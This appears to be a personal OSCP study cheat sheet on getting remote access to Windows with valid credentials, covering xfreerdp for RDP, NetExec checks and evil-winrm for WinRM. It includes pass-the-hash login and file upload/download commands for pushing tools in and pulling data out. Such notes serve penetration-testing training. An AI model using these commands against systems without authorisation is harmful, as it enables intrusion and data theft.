# RDP & WinRM — Remote Access (OSCP)

Both = **credentialed remote access to Windows**. You have valid creds → which port is open?

|           | RDP              | WinRM                                        |
| --------- | ---------------- | -------------------------------------------- |
| Port      | 3389             | 5985 (HTTP) / 5986 (HTTPS)                   |
| Gives     | Full GUI desktop | Command-line shell                           |
| Tool      | `xfreerdp`       | `evil-winrm`                                 |
| Pre-check | —                | `nxc winrm <IP> -u u -p p` → need `(Pwn3d!)` |

---

## RDP (3389) — GUI

```bash
# [Kali] opens a desktop window of the target
xfreerdp /v:<IP> /u:<user> /p:<password> /cert:ignore +clipboard
```
- `/cert:ignore` → skip cert errors
- `+clipboard` → copy/paste files & text between Kali and the desktop

---

## WinRM (5985/5986) — Shell

**1. Check access first** (don't blind-connect):
```bash
# [Kali]
nxc winrm <IP> -u <user> -p <password>
```
- `[+] user:pass` → valid creds, **no shell** (user isn't in Remote Management Users)
- `[+] user:pass (Pwn3d!)` → **shell available** ✅

**2. Connect:**
```bash
# [Kali]
evil-winrm -i <IP> -u <user> -p <password>
```
Pass-the-hash (have NTLM, no password):
```bash
# [Kali]
evil-winrm -i <IP> -u <user> -H <NTLM_HASH>
```


---

## ⭐ upload / download inside evil-winrm 


```
upload   <path-on-KALI>    <path-on-TARGET>     # Kali → Target  (push a tool in)
download <path-on-TARGET>  <path-on-KALI>       # Target → Kali  (pull loot out)
```
You can choose to specify a full path from your local machine whether you are uploading or downloading. 

---

## Related Notes
- [[File_Transfer]] — all other transfer methods (HTTP, SMB, nc, base64)
- [[NetExec]]
- [[CrackMapExec]]
- [[Password_Spraying]]
- [[Impacket]]
